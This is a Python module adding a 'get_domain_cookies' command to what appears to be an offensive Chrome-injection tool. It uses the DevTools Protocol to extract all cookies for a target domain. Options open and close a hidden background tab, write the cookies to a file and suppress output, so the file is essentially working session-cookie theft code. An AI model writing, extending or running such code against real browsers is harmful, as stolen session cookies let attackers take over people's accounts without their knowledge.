import cmd2
import argparse
from cmd2 import CommandSet, with_argparser, with_category, with_default_category
from helperclass import helperclass
from helperclass.helperclass import HelperClass

# Get cookies based on domain via CI
# Only works for exact domain at the momment
# e.g. https://google.com will NOT return for https://accounts.google.com
_get_domain_cookies_parser = cmd2.Cmd2ArgumentParser()
_get_domain_cookies_parser.add_argument('-d', '--domain', default = None, required = True,
                                            type=str,
                                            help='specific domain to get cookies (e.g. https://google.com)')
_get_domain_cookies_parser.add_argument('-i', '--injector', required = True,
                                    choices_provider = HelperClass.get_injector_names,
                                    type=str, help='target ChromeInjector')
_get_domain_cookies_parser.add_argument('-v', '--navigate', action ='store_true', required = False,
                                        help='flag to navigate to domain in new tab, then close tab')
_get_domain_cookies_parser.add_argument('-p', '--path', default = None, required = False,
                                type=str, help='path to outfile', completer=cmd2.Cmd.path_complete)
_get_domain_cookies_parser.add_argument('-o', '--overwrite', action ='store_true', required = False,
                                        help='flag to overwrite previously written out file')
_get_domain_cookies_parser.add_argument('-l', '--silent', action ='store_true', required = False,
                                        help='flag to execute silently and not print output')
_get_domain_cookies_parser.add_argument('-e', '--timeout', default = None, type=int, required = False,
                                        help='timeout in seconds')
@cmd2.as_subcommand_to('exec', 'get_domain_cookies', _get_domain_cookies_parser)
def get_domain_cookies(self, ns: argparse.Namespace):
    """Get specific domain cookies via ChromeInjector"""
    ci = HelperClass.get_injector(ns.injector)
    http_present = True
    if not ci:
        return
    if ns.navigate:
        self._cmd.pwarning("Opening new tab (backgrounded) to get cookies")
        ws_url, targetID = ci.cdp_new_window(ns.domain, background=True)
        self._cmd.poutput(f"New tab with ws_url: {ws_url}")
        cookies = ci.cdp_get_open_tab_cookies(time=ns.timeout, ws_url=ws_url)
        closed = ci.cdp_close_window(targetID)
        if closed:
            self._cmd.poutput(f"New tab succesfully closed")
        else:
            self._cmd.pwarning("Failed to close new tab")
    domain_dict = {"urls":[ns.domain]}

    for domain in domain_dict["urls"]:
        if "http" not in domain:
            http_present = False
            break
    if not http_present:
        self._cmd.pwarning("No 'http(s)://' in one or more domains")

    cookies = ci.cdp_get_domain_cookies(domain_dict, time=ns.timeout)
    HelperClass.write_out(ns.path, str(cookies), ns.overwrite)
    if not ns.silent and cookies:
        self._cmd.poutput(f"Response:\n{cookies}")